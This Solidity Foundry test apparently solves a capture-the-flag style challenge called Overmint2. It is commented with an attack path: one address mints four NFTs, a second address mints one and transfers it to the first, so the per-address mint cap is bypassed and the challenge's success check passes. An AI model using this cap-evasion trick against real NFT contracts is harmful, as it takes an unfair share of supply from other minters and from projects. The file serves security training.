// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "lib/forge-std/src/Test.sol";
import {Overmint2} from "../src/Overmint2.sol";

contract Overmint2Test is Test {
    Overmint2 public overmint2;
    address private alice;
    address private bob;

    function setUp() public {
        overmint2 = new Overmint2();
        alice = vm.addr(1);
        bob = vm.addr(2);
    }

    // Attack Path:
    // 1. call mint() function from alice address 4 times
    // 2. call mint() function from bob address 1 time
    // 3. transfer bob NFT (id = 5) to alice

    function testAttack() public {
        vm.startPrank(alice);
        for (uint256 i = 0; i < 4; i++) {
            overmint2.mint();
        }
        vm.stopPrank();

        vm.startPrank(bob);
        overmint2.mint();
        overmint2.transferFrom(bob, alice, 5);
        vm.stopPrank();

        vm.prank(alice);
        assertEq(overmint2.success(), true);
    }
}
